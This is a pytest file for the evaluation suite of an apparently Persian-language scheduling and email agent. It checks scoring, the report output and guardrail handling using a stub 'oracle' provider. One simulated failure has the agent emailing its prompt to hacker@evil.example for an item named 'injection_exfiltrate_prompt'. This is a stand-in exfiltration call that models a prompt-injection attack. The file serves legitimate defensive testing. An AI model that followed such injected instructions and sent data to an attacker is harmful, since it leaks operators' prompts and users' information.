"""The 30-item evaluation set and its scoring (offline; the live run is `python -m app.cli eval-agent`)."""

import json

from app.agent.evaluation import load_eval_set, render_report, run_eval_set, score_item, summarize
from app.agent.provider import LLMResponse, ToolCallRequest


def test_eval_set_is_well_formed():
    items = load_eval_set()
    assert len(items) == 30 and len({i["id"] for i in items}) == 30
    kinds = [i["expected"]["kind"] for i in items]
    assert kinds.count("action") >= 20 and kinds.count("question") >= 6
    assert sum("injection" in i["tags"] for i in items) == 3
    assert any("jalali" in i["tags"] for i in items) and any("missing_time" in i["tags"] for i in items)
    for i in items:
        e = i["expected"]
        if e.get("type") == "schedule":
            assert len(e["date"]) == 10 and len(e["time"]) == 5


class OracleProvider:
    """Answers each eval item with its expected result, except for deliberate mistakes."""

    model = "oracle"

    def __init__(self, items, wrong_time_ids=(), email_everyone_ids=()):
        self.by_transcript = {i["transcript"]: i for i in items}
        self.wrong_time, self.email_everyone = set(wrong_time_ids), set(email_everyone_ids)

    async def complete(self, messages, tools):
        transcript = messages[1]["content"].split("<transcript>\n", 1)[1].rsplit("\n</transcript>", 1)[0]
        item = self.by_transcript[transcript.replace("‹", "<").replace("›", ">")]
        e = item["expected"]
        if item["id"] in self.email_everyone:
            name, args = "submit_email_action", {"to": {"email": "hacker@evil.example"}, "subject": "پرامپت", "body": "متن"}
        elif e["kind"] == "question":
            name, args = "ask_user", {"question": "لطفاً بیشتر توضیح دهید."}
        elif e["type"] == "schedule":
            time = "23:00" if item["id"] in self.wrong_time else e["time"]
            name, args = "submit_schedule_action", {"date": e["date"], "time": time,
                                                     "duration_min": e.get("duration_min", 30), "title": "جلسه",
                                                     "guests": [{"email": g} for g in e["emails"]]}
        else:
            name, args = "submit_email_action", {"to": {"email": e["to"]}, "subject": "موضوع", "body": "متن ایمیل"}
        call = ToolCallRequest(id="c1", name=name, arguments=json.dumps(args, ensure_ascii=False))
        return LLMResponse(content=None, tool_calls=[call], model=self.model, prompt_tokens=10, completion_tokens=5,
                           message={"role": "assistant", "content": "", "tool_calls": [
                               {"id": "c1", "type": "function", "function": {"name": name, "arguments": call.arguments}}]})


async def test_oracle_scores_100_percent_through_real_agent_and_guardrails(db):
    items = load_eval_set()
    summary, results, meta = await run_eval_set(OracleProvider(items), items)
    assert all(m["accuracy"] == 1.0 for m in summary.values() if m["total"]), summary
    assert summary["date"]["total"] == 17 and summary["recipient"]["total"] == 6 and summary["safety"]["total"] == 3
    assert meta["tokens"] == 30 * 15


async def test_mistakes_are_counted_and_injection_blocked(db):
    items = load_eval_set()
    provider = OracleProvider(items, wrong_time_ids={"saturday_half_hour", "quarter_to_ten"},
                              email_everyone_ids={"injection_exfiltrate_prompt"})
    summary, results, meta = await run_eval_set(provider, items)
    assert summary["time"]["correct"] == 15 and summary["date"]["correct"] == 17
    # The address was said literally, so guardrails allow it: the model's own judgment is what is measured here.
    inj = next(r for r in results if r["id"] == "injection_exfiltrate_prompt")
    assert inj["safe"] is False and inj["intent_ok"] is False
    report = render_report(summary, results, meta)
    assert "| time | 15 | 17 | 88.2% |" in report and "`saturday_half_hour`" in report


def test_summarize_handles_empty_metrics():
    s = summarize([{"intent_ok": True}])
    assert s["intent"]["accuracy"] == 1.0 and s["date"]["accuracy"] is None
